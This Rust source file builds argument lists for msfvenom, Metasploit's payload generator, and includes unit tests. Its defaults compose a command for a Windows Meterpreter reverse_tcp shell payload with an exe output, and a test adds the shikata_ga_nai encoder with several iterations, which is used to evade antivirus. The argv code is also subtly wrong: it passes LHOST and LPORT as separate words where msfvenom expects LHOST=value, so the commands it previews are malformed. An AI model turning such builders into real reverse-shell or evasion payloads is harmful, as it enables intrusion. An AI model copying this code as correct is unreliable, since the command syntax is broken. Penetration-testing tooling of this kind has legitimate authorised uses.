/// Build an `msfvenom` argv. Does not generate payload bytes.
#[derive(Clone, Debug)]
pub struct VenomSpec {
    pub payload: String,
    pub lhost: String,
    pub lport: String,
    pub format: String,
    pub encoder: String,
    pub iterations: u32,
    pub outfile: String,
    pub extra: String,
}

impl Default for VenomSpec {
    fn default() -> Self {
        Self {
            payload: "windows/x64/meterpreter/reverse_tcp".into(),
            lhost: "127.0.0.1".into(),
            lport: "4444".into(),
            format: "exe".into(),
            encoder: String::new(),
            iterations: 1,
            outfile: "payload.bin".into(),
            extra: String::new(),
        }
    }
}

impl VenomSpec {
    pub fn argv(&self) -> Vec<String> {
        let mut a = vec![
            "msfvenom".into(),
            "-p".into(),
            self.payload.clone(),
            "LHOST".into(),
            self.lhost.clone(),
            "LPORT".into(),
            self.lport.clone(),
            "-f".into(),
            self.format.clone(),
        ];
        if !self.encoder.is_empty() {
            a.push("-e".into());
            a.push(self.encoder.clone());
            if self.iterations > 1 {
                a.push("-i".into());
                a.push(self.iterations.to_string());
            }
        }
        if !self.outfile.is_empty() {
            a.push("-o".into());
            a.push(self.outfile.clone());
        }
        if !self.extra.is_empty() {
            a.extend(self.extra.split_whitespace().map(|s| s.to_string()));
        }
        a
    }

    pub fn preview(&self) -> String {
        self.argv().join(" ")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn argv_basic() {
        let v = VenomSpec::default();
        let a = v.argv();
        assert_eq!(a[0], "msfvenom");
        assert!(a.contains(&"-p".into()));
        assert!(a.contains(&"windows/x64/meterpreter/reverse_tcp".into()));
        assert!(a.contains(&"-o".into()));
    }

    #[test]
    fn argv_encoder() {
        let mut v = VenomSpec::default();
        v.encoder = "x86/shikata_ga_nai".into();
        v.iterations = 3;
        let p = v.preview();
        assert!(p.contains("-e x86/shikata_ga_nai"));
        assert!(p.contains("-i 3"));
    }
}
